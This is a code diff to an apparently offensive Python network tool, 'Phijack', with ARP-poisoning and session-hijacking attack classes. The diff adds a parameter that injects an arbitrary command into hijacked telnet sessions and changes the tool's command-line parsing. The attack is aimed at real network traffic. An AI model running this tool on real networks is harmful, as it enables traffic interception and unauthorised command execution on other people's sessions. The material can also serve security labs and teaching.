@@ -5,9 +5,9 @@ import globals
 ASCII_ART = """
  ____    __                                 __         
 /\  _`\ /\ \      __    __                 /\ \        
-\ \ \L\ \ \ \___ /\_\  /\_\     __      ___\ \ \/'\    
+\ \ \_\ \ \ \___ /\_\  /\_\     __      ___\ \ \/'\    
  \ \ ,__/\ \  _ `\/\ \ \/\ \  /'__`\   /'___\ \ , <    
-  \ \ \/  \ \ \ \ \ \ \ \ \ \/\ \L\.\_/\ \__/\ \ \\\\`\  
+  \ \ \/  \ \ \ \ \ \ \ \ \ \/\ \_\.\_/\ \__/\ \ \\\\`\  
    \ \_\   \ \_\ \_\ \_\_\ \ \ \__/.\_\ \____\\\\ \_\ \_\\
     \/_/    \/_/\/_/\/_/\ \_\ \/__/\/_/\/____/ \/_/\/_/
                        \ \____/                        
@@ -83,10 +83,11 @@ class ArpPoisoning(Attack):
 
 
 class SessionHijacking(Attack):
-    def __init__(self, target, gateway, proto, iface):
+    def __init__(self, target, gateway, proto, iface, cmd=None):
         self.target = target
         self.gateway = gateway
         self.proto = proto
+        self.cmd = cmd
         super().__init__(iface)
 
     def __call__(self):
@@ -122,14 +123,14 @@ class SessionHijacking(Attack):
 
         elif self.proto == 'telnet':
             globals.PROTO = 'telnet'
-            globals.CMD = args.cmd
+            globals.CMD = self.cmd
             filter = f"ip and tcp port 23 and ether src {gatewayMAC}"
 
         arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, self.iface)
 
     @staticmethod
     def get_params():
-        return {'TARGET': '', 'GATEWAY': '', 'PROTO': ''}
+        return {'TARGET': '', 'GATEWAY': '', 'PROTO': '', 'CMD': ''}
 
 
 class CommandHandler:
@@ -152,10 +153,10 @@ class CommandHandler:
         if cmd.startswith("SET"):
             data = cmd.split()
 
-            if len(data) != 3:
+            if len(data) < 3:
                 raise ValueError("Expected SET <key> <value>")
 
-            key, value = data[1:]
+            key, value = data[1], ' '.join(data[2:])
 
             if key.lower() == 'iface':
                 self.iface = value
@@ -211,7 +212,8 @@ class CommandHandler:
                     self.attack_params['TARGET'],
                     self.attack_params['GATEWAY'],
                     self.attack_params['PROTO'],
-                    self.iface
+                    self.iface,
+                    cmd=self.attack_params['CMD']
                 )
 
             try:
@@ -224,7 +226,7 @@ class CommandHandler:
 
         else:
             # Allow system commands
-            print(os.system(cmd))
+            os.system(cmd)
 
         return False
 
@@ -247,13 +249,17 @@ def main():
     globals.MY_IP = get_if_addr(conf.iface)
 
     cmd_handler = CommandHandler()
+
     while True:
         try:
-            cmd_handler.parse_cmd(input('[Phijack] > '))
+            if cmd_handler.parse_cmd(input('[Phijack] > ')):
+                break
+
         except KeyboardInterrupt:
             print()
             print("Bye!")
             break
+
         except ValueError as e:
             print(e)
 
